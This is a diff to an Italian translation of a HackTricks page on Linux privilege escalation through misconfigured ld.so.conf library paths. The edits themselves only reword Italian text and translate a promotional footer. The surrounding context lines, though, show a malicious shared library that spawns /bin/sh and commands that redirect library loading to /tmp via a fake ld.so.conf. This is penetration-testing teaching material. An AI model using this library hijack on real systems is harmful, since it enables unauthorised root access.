@@ -24,7 +24,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 {% endhint %}
 {% endhint %}
 
-## Prepara l'ambiente
+## Preparare l'ambiente
 
 Nella sezione seguente puoi trovare il codice dei file che utilizzeremo per preparare l'ambiente
 
@@ -103,7 +103,7 @@ printf("I'm the bad library\n");
 system("/bin/sh",NULL,NULL);
 }
 ```
-Ora che abbiamo **creato la libreria maligna libcustom all'interno del percorso mal configurato**, dobbiamo aspettare un **riavvio** o che l'utente root esegua **`ldconfig`** (_nel caso tu possa eseguire questo binario come **sudo** o abbia il **bit suid** potrai eseguirlo tu stesso_).
+Ora che abbiamo **creato la libreria maligna libcustom all'interno del percorso mal configurato**, dobbiamo aspettare un **riavvio** o che l'utente root esegua **`ldconfig`** (_nel caso in cui tu possa eseguire questo binario come **sudo** o abbia il **bit suid** potrai eseguirlo tu stesso_).
 
 Una volta che ciò è accaduto, **ricontrolla** da dove l'eseguibile `sharevuln` sta caricando la libreria `libcustom.so`:
 ```c
@@ -125,10 +125,10 @@ ubuntu
 Nota che in questo esempio non abbiamo elevato i privilegi, ma modificando i comandi eseguiti e **aspettando che l'utente root o un altro utente privilegiato esegua il binario vulnerabile** saremo in grado di elevare i privilegi.
 {% endhint %}
 
-### Altre misconfigurazioni - Stessa vulnerabilità
+### Altre configurazioni errate - Stessa vulnerabilità
 
-Nell'esempio precedente abbiamo simulato una misconfigurazione in cui un amministratore **ha impostato una cartella non privilegiata all'interno di un file di configurazione in `/etc/ld.so.conf.d/`**.\
-Ma ci sono altre misconfigurazioni che possono causare la stessa vulnerabilità; se hai **permessi di scrittura** in qualche **file di configurazione** all'interno di `/etc/ld.so.conf.d`, nella cartella `/etc/ld.so.conf.d` o nel file `/etc/ld.so.conf`, puoi configurare la stessa vulnerabilità e sfruttarla.
+Nell'esempio precedente abbiamo simulato una configurazione errata in cui un amministratore **ha impostato una cartella non privilegiata all'interno di un file di configurazione dentro `/etc/ld.so.conf.d/`**.\
+Ma ci sono altre configurazioni errate che possono causare la stessa vulnerabilità; se hai **permessi di scrittura** in qualche **file di configurazione** dentro `/etc/ld.so.conf.d`, nella cartella `/etc/ld.so.conf.d` o nel file `/etc/ld.so.conf` puoi configurare la stessa vulnerabilità e sfruttarla.
 
 ## Exploit 2
 
@@ -141,7 +141,7 @@ echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
 Ora, come indicato nel **precedente exploit**, **crea la libreria malevola all'interno di `/tmp`**.\
-E infine, carichiamo il percorso e verifichiamo da dove viene caricata la libreria:
+E infine, carichiamo il percorso e controlliamo da dove il binario sta caricando la libreria:
 ```bash
 ldconfig -f fake.ld.so.conf
 
@@ -155,16 +155,16 @@ libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
 
 {% hint style="info" %}
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Supporta HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
 
 </details>
 {% endhint %}
